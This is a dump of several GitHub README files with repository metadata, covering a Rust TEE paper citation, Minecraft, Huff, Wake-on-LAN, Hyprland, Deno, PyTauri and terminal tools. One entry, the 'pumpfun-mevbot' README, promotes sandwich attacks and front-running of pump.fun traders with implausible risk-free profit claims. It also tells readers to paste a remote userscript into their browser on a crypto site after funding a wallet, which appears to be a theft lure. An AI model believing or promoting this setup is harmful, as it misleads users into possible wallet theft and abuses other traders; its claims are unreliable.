address = {New York, NY, USA},
url = {https://doi.org/10.1145/3620665.3640398},
doi = {10.1145/3620665.3640398},
abstract = {As trusted execution environments (TEE) have become the corner stone for secure cloud computing, it is critical that they are reliable and enforce proper isolation, of which a key ingredient is spatial isolation. Many TEEs are implemented in software such as hypervisors for flexibility, and in a memory-safe language, namely Rust to alleviate potential memory bugs. Still, even if memory bugs are absent from the TEE, it may contain semantic errors such as mis-configurations in its memory subsystem which breaks spatial isolation.In this paper, we present the verification of the memory subsystem of a software TEE in Rust, namely HyperEnclave. We prove spatial isolation for the secure enclave though correct configuration of page tables for an early prototype of HyperEnclave. To formally model Rust code, we introduce a lightweight formal semantics for the Mid-level intermediate representation (MIR) of Rust. To make verification scalable for such a complex system, we incorporate the MIR semantics with a layered proof framework.},
booktitle = {Proceedings of the 29th ACM International Conference on Architectural Support for Programming Languages and Operating Systems, Volume 2},
pages = {1218‚Äì1232},
numpages = {15},
keywords = {formal verification, rust, trusted execution environments, extended page tables},
location = {La Jolla, CA, USA},
series = {ASPLOS '24}
}

```

# License
Except where noted otherwise, HyperEnclave's hypervisor is under the Apache License (Version 2.0). See the [LICENSE](./LICENSE) files for details.
",0,10,1,Apache-2.0,,6.0
mcbrawls/inject,master,"# inject
Inject is a simple server-side library to allow developers to inject into Netty easier.

## Example
This uses the `HttpInjector` class to respond to HTTP requests to the Minecraft
server.

```java
class MyEpicHttpInjector extends HttpInjector {
    @Override
    public HttpByteBuf intercept(ChannelHandlerContext ctx, HttpRequest request) {
        HttpByteBuf buf = HttpByteBuf.httpBuf(ctx);
        buf.writeStatusLine(""1.1"", 200, ""OK"");
        buf.writeText(""Hello, from Minecraft!"");
        return buf;
    }
}
```

## Registration
For Fabric, use the `InjectFabric` class:
```java
public class MyMod implements ModInitializer {
    @Override
    public void onInitialize() {
        InjectFabric.INSTANCE.registerInjector(new MyEpicHttpInjector());
    }
}
```

For Paper, use the `InjectPaper` class:
```java
public class MyPlugin extends JavaPlugin {
    @Override
    public void onEnable() {
        InjectPaper.INSTANCE.registerInjector(new MyEpicHttpInjector());
    }
}
```

For Spigot, use the `InjectSpigot` class:
```java
public class MyPlugin extends JavaPlugin {
    @Override
    public void onEnable() {
        InjectSpigot.INSTANCE.registerInjector(new MyEpicHttpInjector());
    }
}
```

> [!CAUTION]
> The Spigot module does not function on Paper. Please use the Paper module and check what the server
> is running on, and decide based on that. The Spigot module uses reflection into internals which are
> renamed on Paper due to mojang mappings at runtime.

This will register an HTTP injector which will respond with `Hello, from Minecraft!`
to any HTTP request to the Minecraft port.

```bash
$ curl http://localhost:25565
Hello, from Minecraft!
```

## Usage
Add the andante repo to gradle:
```kt
repositories {
    maven(""https://maven.andante.dev/releases/"")
}
```

Add the dependency:
```kt
dependencies {
    implementation(""net.mcbrawls.inject:api:VERSION"")
    
    // HTTP-related things:
    implementation(""net.mcbrawls.inject:http:VERSION"")

    // Fabric:
    include(modImplementation(""net.mcbrawls.inject:fabric:VERSION"")!!)
 
    // Paper:
    implementation(""net.mcbrawls.inject:paper:VERSION"")

    // Spigot:
    implementation(""net.mcbrawls.inject:spigot:VERSION"")
}
```

Replace `VERSION` with the latest version from the releases tab.
",10,0,2,MIT,,1.0
huff-language/huff2,main,"# Huff 2

Huff2 is the successor of the [huff-rs](https://github.com/huff-language/huff-rs) compiler written
in Rust. It comes with:
- better error handling
- clearer semantics (only 1 label def. per scope, checks for macro argument count match)
- push minimization (e.g. will use `PUSH1` instead of `PUSH2` if referencing a label with `PC < 256`)
- new builtins:
    - `__codeoffset(macro_name: MacroIdentifier)`

## Missing Features / TODOs

- [ ] Jump tables
    - [ ] parsing
    - [ ] builtins (`__tablestart`, `__tablesize`)
- [ ] Code tables
    - [ ] builtins (`__tablestart`, `__tablesize`)
- [ ] ABI builtins (`__FUNC_SIG`, `__EVEN_HASH`, `__ERROR`)
- [ ] Imports (`#include` statements)

## Why rewrite `huff-rs`?

The [`huff-rs`](https://github.com/huff-language/huff-rs) compiler was a passion project by pioneers
in the Huff community who aimed to create a better version of Zac's
[original typescript implementation](https://github.com/AztecProtocol/huff).

The initial developers of `huff-rs` were relatively new to compilers, choosing to write some of the
components like the lexer, parser & assembler themselves while adding novel compiler features like
the Huff testing framework that unfortunately didn't see a lot of usage.

Combined with a lot of the tech debt that accrued from the early days made us decide that it was
best to start fresh, using existing libraries to do as much of the heavy lifting as possible:
- [`chumsky`](https://github.com/zesterer/chumsky/) for lexing & parsing
- [`ariadne`](https://github.com/zesterer/ariadne) for pretty errors
- [`evm-glue`](https://github.com/philogy/evm-glue) for EVM assembly
- [`alloy`](https://alloy.rs/) for ABI types & parsing

This new foundation will allow bugs to be fixed more easily as well as allowing us to experiment
with our own novel compiler features. üòÅ

## Differences vs. `huff-rs`
### CLI Changes
The `-b`, `--bytecode`, `-r`, `--bin-runtime`, `-m`, `--alt-main`, `-t`, `--alt-constructor` have
been replaced in favor of a required positional argument indicating what macro to compile and
optional `-f` / `--default-constructor` flags to wrap the compiled result with a minimal default
constructor.

This was done to make the CLI simpler and clearer, you will always get a single output, the output
you ask for and nothing extra will be added without you asking for it.

A lot of other flags were not reimplemented either because they were not widely used or because we
just haven't gotten around to it. Raise an issue if you'd like to suggest a feature.

### Stricter Code Validation
The compiler will not validatate certain things that were not checked/simply allowed in the previous
compiler:
- duplicate label definitions in the same scope
- duplicate definitions (you could define multiple constants, macros, etc. with identical names)
- mismatching macro argument count

These errors were serious footguns that could easily go unnoticed when using the previous compiler.

### New Label & Jump Table Semantics

1. **Up Only**: Macros can only reference labels defined within them or the parents invoking them
2. **Shadowing:** Label definitions deeper down in a chain of invocations shadows previous definitions

**Examples:**

References resolve to the labels defined within the same macro:

```

#define macro INNER() = {
    target   ‚úÖ Resolves ‚îÄ‚îê
                          ‚îÇ
    0x1 0x1               ‚îÇ
    add                   ‚îÇ
    0x2                   ‚îÇ
    eq                    ‚îÇ
                          ‚îÇ
    target:  <‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
}

```

Falls back to resolving to invoker's label:

```
#define macro MAIN() = takes(0) returns(0) {
    INNER() ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
    target: <‚îÄ‚îÄ‚îÄ‚îò
}


#define macro INNER() = {
                ^
                ‚îÇ
    target   ‚úÖ Resolves

    0x1 0x1
    add
    0x2
    eq
}
```

Resolution **does not** go down into invoked macros:

```
#define macro MAIN() = takes(0) returns(0) {
    INNER()
    target   ‚ùå Fails to Resolve
}

#define macro INNER() = {
    target:

    0x1 0x1
    add
    0x2
    eq
}
```

As you go down an invocation chain label definitions are added to a stack where the highest most
definition is resolved by references.

```
#define macro MAIN() = takes(0) returns(0) {
    INNER()
    target:  üü° Shadowed by ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
}                               ‚îÇ
                                ‚îÇ
                                ‚îÇ
#define macro INNER() = {       ‚îÇ
    target   ‚úÖ Resolves ‚îÄ‚îê     ‚îÇ
                          ‚îÇ     ‚îÇ
    0x1 0x1               ‚îÇ     ‚îÇ
    add                   ‚îÇ     ‚îÇ
    0x2                   ‚îÇ     ‚îÇ
    eq                    ‚îÇ     ‚îÇ
                          ‚îÇ     ‚îÇ
    target:  <‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò <‚îÄ‚îÄ‚îÄ‚îò
}
```

",0,2,2,Apache-2.0,ci.yml,19.0
darwindarak/rallyup,master,"# `rallyup`

`rallyup` is a lightweight Wake-On-LAN (WOL) scheduler and dependency manager designed for small businesses and homelabs. It ensures that infrastructure services like firewalls, storage, and hypervisors are brought online in the correct order, particularly after events like power outages.

A typical setup involves configuring most of the infrastructure for WOL but not for Wake-On-Power, and setting `rallyup` to run on startup on a low-power device like a Raspberry Pi. When you need to bring the entire environment online, simply power on the device running `rallyup`, and the rest of the infrastructure will automatically follow in the correct order.

![Tests](https://github.com/darwindarak/rallyup/actions/workflows/tests.yml/badge.svg)
[![Crates.io](https://img.shields.io/crates/v/rallyup.svg)](https://crates.io/crates/rallyup)

## Features

- [x] *VLAN Support*: Send WOL packets to devices across different VLANs.
- [x] *YAML Configuration*: Easily define server boot sequences, dependencies, and status checks.
- [ ] *Service Status Checks*: Verify that a service is up using built-in status checks (HTTP health checks, NFS, SMB, custom shell commands).
    - [x] HTTP
    - [x] Open port
    - [x] Shell
    - [ ] NFS (might just use open port check)
    - [ ] SMB (might just use open port check)
- [ ] *Plugin-Friendly*: Users can write their own custom status check plugins.

## Usage

```sh
rallyup servers.yaml
```

## Configuration

The dependencies between servers, along with the methods for validating that they are online, are defined in a YAML configuration file.

## Servers Configuration

**Fields**:
- **name**: The name of the server, used for identification when defining dependencies between servers
- **mac**: The MAC address of the server we want to wake up
- **interface**: The network interface to use when sending the WOL packet
- **vlan**: The VLAN ID (optional) that the server is on
- **depends**: A list of other server names that this server depends on
- **check**: A list of health checks that must pass before this server is considered fully online

**Example**:
```yaml
- name: ""firewall""
  mac: ""00:11:22:33:44:55""
  interface: ""eth0""
  vlan: 100
  depends:
    - ""storage""
  check: [... see below]
```
- 
## Health Check Configurations

Each server can have multiple health checks to ensure the server is fully online before the next device starts up.

### Common Fields

- **retry**: The interval, defined in human readable string (e.g. 1s, 1 minute, etc.) to wait between retrying this health check
- **timeout**: The timeout interval after which the check, and subsequently the entire boot sequence, will fail

### Built-in Health Checks

#### HTTP Health Checks

The HTTP health check verifies whether a specified endpoint responds as expected.

**Fields**
- **type**: should be `http` for an HTTP health check.
- **url**:  The URL to perform the HTTP health check against
- **status**: Expected HTTP status code
- **regex**: Regex to match in the response body 

> Note: You must provide either `status` or `regex`, or both.

**Example**
```yaml
- type: http
  url: ""http://192.168.1.1/health""
  status: 200
  retry: 5s
  timeout: 30s
```

#### Port Health Check

The port health check verifies whether a specified TCP port on a server is open and accessible. 
This is really a stand-in for verifying NFS and SMB ports until I can figure out how to check if those services are online.

**Fields**
- **type**: should be `port` for a port health check
- **ip**: the IP address to check
- **port**: the port number to check

**Example**
```yaml
- type: port
  ip: ""192.168.1.1""
  port: 22
  retry: ""10s""
  timeout: ""1m""
```

#### Shell Health Checks

The shell health check executes a shell command checks the result.
This is to provide the option of user-defined health checks.

**Fields**
- **type**: should be `shell` for a shell health check.
- **command**:  he shell command to execute
- **status**: Expected exit code
- **regex**: Regex to match in the standard output

> Note: You must provide either `status` or `regex`, or both.

**Example**
```yaml
- type: shell
  command: ping -c 1 192.168.1.1
  status: 0
  retry: 5s
  timeout: 20s
```

### Full Example

> TODO:
> - [ ] Need to test in the lab and post the actual sample

```yaml
- name: ""Firewall""
  mac: ""00:1A:2B:3C:4D:5E""
  interface: eth0
  vlan: 10
  depends: []
  check:
    - type: http
      url: ""http://192.168.1.1/health""
      status: 200
      regex: 'ok'

- name: ""Storage Server 1""
  mac: ""00:1A:2B:3C:4D:5F""
  interface: eth0
  vlan: 100
  depends:
    - ""Firewall""
  check:
    - type: port
      ip: 192.168.100.101
      port: 2049
      timeout: 5 minutes

- name: ""Storage Server 2""
  mac: ""00:1A:2B:3C:4D:5G""
  vlan: 100
  depends:
    - ""Firewall""
  check:
    - type: port
      ip: 192.168.100.102
      port: 445
      retry: 5s

- name: ""VM Host""
  mac: ""00:1A:2B:3C:4D:60""
  vlan: 200
  depends:
    - ""Storage Server 1""
    - ""Storage Server 2""
  check:
    - type: command
      command: ""ping -c 192.168.200.10""
      status: 0
```

## License

This project is licensed under either of the following licenses, at your option:

- [MIT License](./LICENSE-MIT)
- [Apache License 2.0](./LICENSE-APACHE)

You may choose to use this project under the terms of either license.
",1,0,1,Apache-2.0,"release.yml,tests.yml",1.0
orcacr-solana/pumpfun-mevbot,main,"
  
# Solana-Mevbot
fully-automatic on-chain pump.fun solana MEVbot leveraging flashloans and the minimal gas fees of Solana to perform sandwich attacks and front-runs on https://pump.fun. 

> [!IMPORTANT]
> Due to the atomic nature of Flashloan operations, if they aren't profitable the transaction will revert and no net profit will be lost.

# Components

-- onchain solana program

-- website dashboard

# Operation
```mermaid
graph LR
A[MEVBOT] --Identify TX -->C(Mev Buy)--> E(Target Buy)
E --> F(Mev Sell)
F -->J(no arb)
J--tx reverted -->A
F --> H(arbitrage) --profit --> A
```
- The bot is constantly sniffing the https://pump.fun Solana master SPL for user buys, sells, and token creations containing slippage deficits.
> [!TIP]
> Bot operators can target any transaction value within their balance threshold. Generally, higher thresholds net consistently viable transactions
-  Once a transaction is identified, a flashloan is initiated for the target transaction amount, this requires a marginal amount of collateral.
-  The bot will aggresively attempt to front-run the transaction by dynamically monitoring the bribe to the miner and increasing it if necessary so as to be the first transaction mined.
- Depending on the set parameters, the bot will either front-run the Dev's sell to remain in profit, or sell upon the token reaching KOTH.
- The flashloan is then repaid, collateral is reiumbursed and profits are deposited into the operators wallet.
-  If the transaction is unprofitable at any point it will be reverted and the flashloan will be repaid, losing no gas or net profit.

# Setup

  >Requirements
- `a brain`
- `knowledge of onchain dynamics and browser extensions`

1. Download or clone the main branch of this repository

2. Install [Greasemonkey](https://addons.mozilla.org/en-US/firefox/addon/greasemonkey/) ( Firefox) or [Violentmonkey](https://violentmonkey.github.io/) ( Chrome) extension, depending on which browser you have.

4.  If you are using your own deployed Mev Engine along with the dashboard, don't forget to paste your program's SPL address into the `program_address` variable.
> [!IMPORTANT]
>  skip this step if you arent deploying your own program, and want your dashboard to connect to the **ORCA** public MEV program for a .1% trading fee! 
4. Visit https://pump.fun

5. Open the Greasemonkey or Violentmonkey extension

6. Click `+ create new script` or `new user script`

7. Delete the default contents, and copy + paste the full code from the [dashboard](https://github.com/orcacr-solana/pumpfun-mevbot/blob/main/dashboard/PF_Dashboard.js)

8. Save the file. The dashboard has now been installed.

9. Visit https://pump.fun and refresh the page. The dashboard should now be visible

10. Make sure your operator's wallet has 1.5 - 2 SOL for proper token acquisition and smooth operation. 

11. Click ""START""

12. Manage your positions with the position manager, or wait for parameters to trigger.
    
![hj](https://i.postimg.cc/s2fkKTVB/Screenshot-from-2024-09-17-02-02-46.png)

14. Click STOP to stop the bot and close all positions at any time


> [!IMPORTANT]
> The bot will immediately begin searching for and transacting arbitrage on https://pump.fun

> [!TIP]
> Stop the bot any time by clicking the ""STOP"" button. any current transactions will be sold or reverted.

# Tips

- If the dashboard is enabled but not appearing; some chrome-based browsers must have developer mode enabled, you can find the toggle in the top right of the extensions page. 

- Increase the flashloan limit by .5 - 1 SOL if you wish to target more than one or two coins at a time.

# Contributions

Code contributions are welcome. If you would like to contribute please submit a pull request with your suggested changes.

# Support
If you benefitted from the project, show us some support by giving us a star ‚≠ê. Help us pave the way for open-source!
",1,0,1,,,0.0
hyprutils/hyprparser,main,"<div align='center'>

<h2>HyprParser <img src='https://raw.githubusercontent.com/hyprutils/.github/refs/heads/main/hyprutils_transparent.png'width='18' height='18'></h2>

A parser for Hyprland's configuration files written in Rust üöÄü¶Ä

<img src='hyprparser.png' width='200' height='200'><br>

[![Crates.io Version](https://img.shields.io/crates/v/hyprparser)](https://crates.io/crates/hyprparser)

[Hyprland Configuration Documentation](https://wiki.hyprland.org/Configuring/Configuring-Hyprland)

</div>

## Usage
HyprParser is available on [Crates.io](https://crates.io/crates/hyprparser). It can be added as a dependency with:

```bash
$ cargo add hyprparser
```

Here's an example usage:

```toml
# Cargo.toml

[dependencies]
hyprparser = ""0.1.2""
```

```rust
// main.rs

use hyprparser::parse_config;
use std::{env, fs, path::Path};

fn main() {
    let config_path = Path::new(&env::var(""XDG_CONFIG_HOME"").unwrap_or_else(|_| {
        let home = env::var(""HOME"").unwrap_or_else(|_| ""."".to_string());
        format!(""{}/.config"", home)
    }))
    .join(""hypr/hyprland.conf"");

    let config_str = fs::read_to_string(&config_path).unwrap();

    let mut parsed_config = parse_config(&config_str);

    parsed_config.add_entry(""decoration"", ""rounding = 10"");
    parsed_config.add_entry(""decoration.blur"", ""enabled = true"");
    parsed_config.add_entry(""decoration.blur"", ""size = 10"");
    parsed_config.add_entry_headless(""$terminal"", ""kitty"");

    let updated_config_str = parsed_config.to_string();

    fs::write(&config_path, updated_config_str).unwrap();

    println!(""Updated hyprland.conf with new configuration."");
}
```

## TODO
- [ ] Color formatting tests

## Credits
- [Nyx](https://github.com/nnyyxxxx) - The parser (everything), [HyprGUI](https://github.com/hyprutils/hyprgui)
- [Adam](https://github.com/adamperkowski) - Code optimization, unit tests, documentation updates, [HyprGUI](https://github.com/hyprutils/hyprgui)
- [Vaxry](https://github.com/vaxerski) - Hyprland
- [Hyprland](https://github.com/hyprwm/Hyprland) - The wayland compositor

<h6 align='center'>Copyright (C) 2024 HyprUtils<h6>
",5,1,1,GPL-2.0,rust.yml,26.0
niklaskorz/eurorust2024,main,"# Runtime Scripting for Rust Applications

This repository provides a demo for embedding JavaScript or TypeScript for the purpose of runtime scripting
into a Rust application.
It was created as a concise but complete example for my [Runtime Scripting for Rust Applications](<Runtime Scripting for Rust Applications.pdf>) talk at EuroRust 2024 in Vienna.
To this end, the [Deno](https://deno.com/) runtime is used to provide a batteries-included scripting environment.
Deno provides certain [security mechanisms](https://docs.deno.com/runtime/fundamentals/security/) to
restrict access to the network, file system, and other functionalities.
These can be configured as part of the runtime worker.

The demo can be run as `cargo run -- <script_file> [<function_name>]`, where the optional `function_name` defaults to the script's `default` export.

",0,0,1,MIT,,0.0
duzhaokun123/YAPatch,main,"# YAPatch

Yet Another Patching Tool for Android to load xposed modules

## Build

use https://github.com/Reginer/aosp-android-jar/tree/main/android-35 android.jar

```shell
./gradlew patch-loader:copyFiles patch:shadowJar
```

## ÂèØÁî®ÊÄß

Â∑≤ÊµãËØïÂèØÁî®ÁöÑ Â∫îÁî®-Ê®°Âùó,[Ê®°Âùó] Êúâ

- QQ-QAuxiliary
- ÂìîÂì©ÂìîÂì©-ÂìîÂì©Êº´Ê∏∏
- ÂæÆ‰ø°

‰∏çÂèØÁî®ÁöÑ Â∫îÁî® Êúâ

- ËèúÈ∏ü
- Áü•‰πé

## Â∑≤Áü•ÈóÆÈ¢ò

Â≠òÂú®Ëøô‰∏™ÂûÉÂúæÈ°πÁõÆ

## ‰∏ªË¶ÅÊÑüË∞¢
- [Pine](https://github.com/canyie/pine)
- [LSPatch](https://github.com/LSPosed/LSPatch)
- [Xpatch](https://github.com/WindySha/Xpatch)
",10,1,1,,,0.0
WSH032/pytauri,dev,"# PyTauri

[Tauri] bindings for Python through [Pyo3].

[Tauri]: https://github.com/tauri-apps/tauri
[Pyo3]: https://github.com/PyO3/pyo3

> [!NOTE]
>
> WIP: Currently we only support local development.
>
> Once we publish packages to `PyPi`, `Crates.io`, `npm`, you can use `pytauri` for production.

## Features

[notification]: https://docs.rs/tauri-plugin-notification/latest/tauri_plugin_notification/

- Need Rust compiler, but **don't need to write Rust code**!
- No IPC (inter-process communication) overhead, secure and fast, thanks to [Pyo3]!
- Support Tauri official plugins(e.g., [notification]), and you can write your own plugins!

    ![demo](https://github.com/user-attachments/assets/14ad5b51-b333-4d80-b04b-af72c4179571)

- Natively support async python (`asyncio`, `trio` or `anyio`)
- **100%** [Type Completeness](https://microsoft.github.io/pyright/#/typed-libraries?id=type-completeness)
- Ergonomic API (and as close as possible to the Tauri Rust API)

    - Python

        ```python
        from pydantic import BaseModel
        from pytauri import AppHandle, Commands
        from pytauri_plugin_notification import NotificationExt

        commands = Commands()


        class Person(BaseModel):
            name: str


        class Greeting(BaseModel):
            message: str


        @commands.invoke_handler()
        async def greet(person: Person, app_handle: AppHandle) -> Greeting:
            notification_ext = NotificationExt(app_handle)
            notification = notification_ext.notification()
            notification.builder().title(""Greeting"").body(f""Hello, {person.name}!"").show()

            return Greeting(message=f""Hello, {person.name}!"")
        ```

    - Frontend

        ```tsx
        import { pyInvoke, fromJson } from ""tauri-plugin-pytauri-api"";

        export interface Person {
            name: string;
        }

        export interface Greeting {
            message: string;
        }

        export async function greet(person: Person): Promise<Greeting> {
            const response = await pyInvoke(""greet"", person);
            return fromJson(response);
        }
        ```

## Early Access

### Developer Requirements

#### Platforms

- Tier 1: my primary development environment
    - Windows 10
- Tier 2: will got bugs fixed and tested
    - Linux
- Tier 3: will not be tested, may not work
    - MacOS

#### Language

- [Python]: >= 3.9
- [Rust]: The latest stable version
- [Node.js]: LTS version

[Rust]: https://www.rust-lang.org/tools/install
[Python]: https://www.python.org/downloads/
[Node.js]: https://nodejs.org/en/download/package-manager

#### Tools

- [pnpm]: See `package.json`
- [uv]: The latest version

[pnpm]: https://pnpm.io/installation
[uv]: https://docs.astral.sh/uv/getting-started/installation/

#### System Dependencies

- [Tauri Prerequisites](https://tauri.app/start/prerequisites/#system-dependencies)

### Install

```bash
git clone https://github.com/WSH032/pytauri.git
cd pytauri

pnpm install
# build frontend assets
pnpm -r run build

# virtual environment
uv venv
source .venv/bin/activate  # bash/zsh
# or powershell: .venv\Scripts\Activate.ps1

uv pip install setuptools setuptools-rust setuptools-scm
# install demo
uv sync \
    --no-build-isolation-package=pytauri-demo \
    --reinstall-package=pytauri-demo
```

### Usage

```bash
python -m pytauri_demo
```

### Example

See `example`

- Backend
    - Python: `example\python\pytauri_demo\__main__.py`
    - Rust: `example\src\lib.rs`
- Frontend: `example\front\src\ipc.tsx`

## Philosophy

### For Pythoneer

I hope `PyTauri` can become an alternative to [pywebview] and [Pystray], leveraging Tauri's comprehensive features to offer Python developers a GUI framework and a batteries-included development experience similar to [electron] and [PySide].

> PyTauri is inspired by [FastAPI] and [Pydantic], aiming to offer a similar development experience.

### For Rustacean

Through [Pyo3], I hope Rust developers can better utilize the Python ecosystem (e.g., building AI GUI applications with [PyTorch]).

Although Rust's lifetime and ownership system makes Rust code safer, Python's garbage collection (GC) will make life easier. üòÜ

### The Future

In the future, I hope PyTauri can integrate with [nicegui] and [gradio], bringing you a Python full-stack (i.g., without `Node.js`) development experience.

[pywebview]: https://github.com/r0x0r/pywebview
[Pystray]: https://github.com/moses-palmer/pystray
[electron]: https://github.com/electron/electron
[PySide]: https://wiki.qt.io/Qt_for_Python
[FastAPI]: https://github.com/fastapi/fastapi
[Pydantic]: https://github.com/pydantic/pydantic
[PyTorch]: https://github.com/pytorch/pytorch
[nicegui]: https://github.com/zauberzeug/nicegui
[gradio]: https://github.com/gradio-app/gradio

## Credits

PyTauri is a project that aims to provide Python bindings for [Tauri], a cross-platform webview GUI library. `Tauri` is a trademark of the Tauri Program within the Commons Conservancy and PyTauri is not officially endorsed or supported by them. PyTauri is an independent and community-driven effort that respects the original goals and values of Tauri. PyTauri does not claim any ownership or affiliation with the Tauri Program.

## License

This project is licensed under the terms of the *Apache License 2.0*.
",0,0,1,Apache-2.0,,0.0
alexpasmantier/television,main,"<div align=""center"">

# üì∫  television
**A blazingly fast general purpose fuzzy finder TUI.**

![docs.rs](https://img.shields.io/docsrs/television-channels)
[![Crates.io](https://img.shields.io/crates/v/television.svg)](https://crates.io/crates/television)
![GitHub branch check runs](https://img.shields.io/github/check-runs/alexpasmantier/television/main)
![GitHub License](https://img.shields.io/github/license/alexpasmantier/television)
![Crates.io Total Downloads](https://img.shields.io/crates/d/television)

| ![television.png](https://github.com/user-attachments/assets/cffc3556-c9f3-4704-8303-8bddf661d139) | 
|:--:| 
| *The revolution will (not) be televised.* |

</div>

## About
`Television` is a blazingly fast general purpose fuzzy finder TUI.

It is inspired by the neovim [telescope](https://github.com/nvim-telescope/telescope.nvim) plugin and is designed to be fast, efficient, simple to use and easily extensible. It is built on top of [tokio](https://github.com/tokio-rs/tokio), [ratatui](https://github.com/ratatui/ratatui) and the *nucleo* matcher used by the [helix](https://github.com/helix-editor/helix) editor.


## Installation
<details>  
<summary>MacOS</summary>
    
  ```bash
  brew install alexpasmantier/television/television
  ```

</details>
<details>
  <summary>
    Arch Linux
  </summary>

  ```bash
  pacman -S television
  ```

</details>
<details>
  <summary>
    Debian-based (Debian, Ubuntu, Pop!_OS, Linux Mint, etc.)
  </summary>
    
  ```bash
  curl -LO https://github.com/alexpasmantier/television/releases/download/0.5.2/television_0.5.2-1_amd64.deb
  sudo dpkg -i television_0.5.2-1_amd64.deb
  ```
    
</details>
<details>
  <summary>
    Conda-forge (cross-platform)
  </summary>
  
  ```bash
  pixi global install television
  ```
</details>
<details>
  <summary>
    Binary
  </summary>
  
  From the [latest release](https://github.com/alexpasmantier/television/releases/latest) page:
  - Download the latest release asset for your platform (e.g. `tv-vX.X.X-linux-x86_64.tar.gz` if you're on a linux x86 machine)
  - Unpack and copy to the relevant location on your system (e.g. `/usr/local/bin` on macos and linux for a global installation)

</details>
<details>
  <summary>
    Cargo
  </summary>

  Setup the latest stable Rust toolchain via rustup:
  ```bash
  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
  rustup update
  ```
  Install `television`:
  ```bash
  cargo install --locked television
  ```
</details>

## Usage
```bash
tv [channel] #[default: files] [possible values: env, files, git-repos, text, alias]
```
By default, `television` will launch with the `files` channel on.
| <img width=""2213"" alt=""Screenshot 2024-11-10 at 15 04 20"" src=""https://github.com/user-attachments/assets/a0fd70a9-ea26-452a-b235-cbce8aeed67f""> |
|:--:|
| *`tv`'s `files` channel running on the *curl* codebase* |

#### Matcher behavior
`television` uses a fuzzy matching algorithm to filter the list of entries. The algorithm that is used depends on the
input pattern that you provide.

| Matcher | Pattern |
| --- | :---: |
| Fuzzy | `foo` |
| Substring | `'foo` / `!foo` to negate |
| Prefix | `^foo` / `!^foo` to negate |
| Suffix | `foo$` / `!foo$` to negate |
| Exact | `^foo$` / `!^foo$` to negate |

For more information on the matcher behavior, see the
[nucleo-matcher](https://docs.rs/nucleo-matcher/latest/nucleo_matcher/pattern/enum.AtomKind.html) documentation.

## Keybindings
Default keybindings are as follows:

| Key | Description |
| :---: | ----------- |
| <kbd>‚Üë</kbd> / <kbd>‚Üì</kbd> or <kbd>Ctrl</kbd> + <kbd>n</kbd> / <kbd>p</kbd> | Navigate through the list of entries |
| <kbd>Ctrl</kbd> + <kbd>u</kbd> / <kbd>d</kbd> | Scroll the preview pane up / down |
| <kbd>Enter</kbd> | Select the current entry |
| <kbd>Ctrl</kbd> + <kbd>y</kbd> | Copy the selected entry to the clipboard |
| <kbd>Ctrl</kbd> + <kbd>r</kbd> | Toggle remote control mode |
| <kbd>Ctrl</kbd> + <kbd>s</kbd> | Toggle send to channel mode |
| <kbd>Esc</kbd> | Quit the application |

These keybindings can be customized in the configuration file (see [Customization](#customization)).

## Built-in Channels
The following channels are currently available:
- `Files`: search through files in a directory tree.
- `Text`: search through textual content in a directory tree.
- `GitRepos`: search through git repositories anywhere on the file system.
- `Env`: search through environment variables and their values.
- `Alias`: search through shell aliases and their values.
- `Stdin`: search through lines of text from stdin.


## Design (high-level)
#### Channels
**Television**'s design is primarily based on the concept of **Channels**.
Channels are just structs that implement the `OnAir` trait. 

As such, channels can virtually be anything that can respond to a user query and return a result under the form of a list of entries. This means channels can be anything from conventional data sources you might want to search through (like files, git repositories, remote filesystems, environment variables etc.) to more exotic implementations that might inclue a REPL, a calculator, a web browser, search through your spotify library, your email, etc.



**Television** provides a set of built-in **Channels** that can be used out of the box (see [Built-in Channels](#built-in-channels)). The list of available channels
will grow over time as new channels are implemented to satisfy different use cases. 


#### Transitions
When it makes sense, **Television** allows for transitions between different channels. For example, you might want to
start searching through git repositories, then refine your search to a specific set of files in that shortlist of
repositories and then finally search through the textual content of those files.

This can easily be achieved using transitions.

#### Previewers
Entries returned by different channels can be previewed in a separate pane. This is useful when you want to see the
contents of a file, the value of an environment variable, etc. Because entries returned by different channels may
represent different types of data, **Television** allows for channels to declare the type of previewer that should be
used. Television comes with a set of built-in previewers that can be used out of the box and will grow over time.

## Recipes
Here are some examples of how you can use `television` to make your life easier, more productive and fun. You may want to add some of these examples as aliases to your shell configuration file so that you can easily access them.

**NOTE**: *most of the following examples are meant for macOS. Most of the commands should work on Linux as well, but you may need to adjust them slightly.*

#### CDing into git repo
```bash
cd `tv git-repos`
```
#### Opening file in default editor
```bash
open `tv`
```
##### VSCode:
```bash
code --goto `tv`
```
##### Vim
```bash
vim `tv`
```
at a specific line using the text channel
```bash
tv text | xargs -oI {} sh -c 'vim ""$(echo {} | cut -d "":"" -f 1)"" +$(echo {} | cut -d "":"" -f 2)'
```
#### Inspecting the current directory
```bash
ls -1a | tv
```

## Terminal Emulators Compatibility
Here is a list of terminal emulators that have currently been tested with `television` and their compatibility status.

| Terminal Emulator | Tested Platforms | Compatibility |
| --- | :---: | :---: |
| Alacritty | macOS, Linux | ‚úÖ |
| Kitty | macOS, Linux | ‚úÖ |
| iTerm2 | macOS | ‚úÖ |
| Wezterm | macOS, Linux, Windows | ‚úÖ |
| macOS Terminal | macOS | functional but coloring issues |
| Konsole | Linux | ‚úÖ |
| Terminator | Linux | ‚úÖ |
| Xterm | Linux | ‚úÖ |
| Cmder | Windows | ‚úñÔ∏è |
| Foot | Linux | ‚úÖ |
| Rio | macOS, Linux, Windows | ‚úÖ |
| Warp | macOS | ‚úÖ |
| Hyper | macOS | ‚úÖ |




## Customization
You may wish to customize the behavior of `television` by providing your own configuration file. The configuration file
is a simple TOML file that allows you to customize the behavior of `television` in a number of ways.

|Platform|Value|
|--------|:-----:|
|Linux|`$HOME/.config/television/config.toml`|
|macOS|`$HOME/Library/Application Support/com.television/config.toml`|
|Windows|`{FOLDERID_LocalAppData}\television\config`|

**NOTE**: on either platform, `XDG_CONFIG_HOME` will always take precedence over default locations if set, in which case
television will expect the configuration file to be in `$XDG_CONFIG_HOME/television/config.toml`.

You may also override these default paths by setting the `TELEVISION_CONFIG` environment variable to the path of your desired configuration **folder**.

Example:
```bash
export TELEVISION_CONFIG=$HOME/.config/television
